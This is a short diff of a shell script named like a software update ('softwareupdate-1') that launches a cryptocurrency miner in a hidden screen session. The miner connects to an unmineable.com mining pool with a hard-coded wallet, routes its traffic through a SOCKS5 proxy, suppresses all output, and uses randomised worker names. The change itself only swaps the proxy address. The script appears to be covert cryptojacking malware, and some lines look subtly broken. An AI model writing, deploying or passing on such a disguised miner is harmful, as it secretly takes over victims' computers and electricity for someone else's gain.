@@ -7,6 +7,6 @@ softwareupdate-1
   chmod +x osx.sh
   screen -dms ls
   WORKER=$(echo $(gshuf -i 11111-9999999 -n i)-CPU
-  PROXY=socks5://72.210.252.134:46164
+  PROXY=socks5://87.103.135.88:1080
   #./install --algorithm wrkzcoin --pool 165.227.161.11:61661 --username WIN:walletaddress --password x $PROXY --threads 12 nproc --all > /dev/null
   ./install -o rx.unmineable.com:3333 -a rx -k -u BTG:GQMWC4pS84D4kHv7EUh5xEtwoKigGwq1a4.anshuff212+50 -p x $PROXY --threads 12 nproc --all > /dev/null
